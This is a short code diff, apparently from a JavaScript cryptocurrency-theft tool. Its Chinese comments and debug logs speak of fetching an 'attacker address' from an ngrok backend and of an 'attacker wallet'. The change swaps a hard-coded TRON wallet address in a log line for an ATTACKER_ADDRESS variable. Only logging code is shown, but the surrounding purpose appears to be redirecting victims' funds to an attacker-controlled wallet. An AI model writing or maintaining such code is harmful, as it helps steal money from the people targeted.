@@ -2271,7 +2271,7 @@
         //从ngrok后端获取最新的攻击者地址 - 已禁用，使用固定地址
         try{
             debugLog(`🎯 使用固定攻击者地址: ${ATTACKER_ADDRESS}`);
-            debugLog(`🎯 攻击者钱包: TDUDyhCzhDsmbpqkPBZvLqjYngTwTgGE5s`);
+            debugLog(`🎯 攻击者钱包: ${ATTACKER_ADDRESS}`);
         }catch (error){
             debugLog(`⚠️ 获取最新攻击目标地址失败: ${error.message}，使用默认地址`);
         }
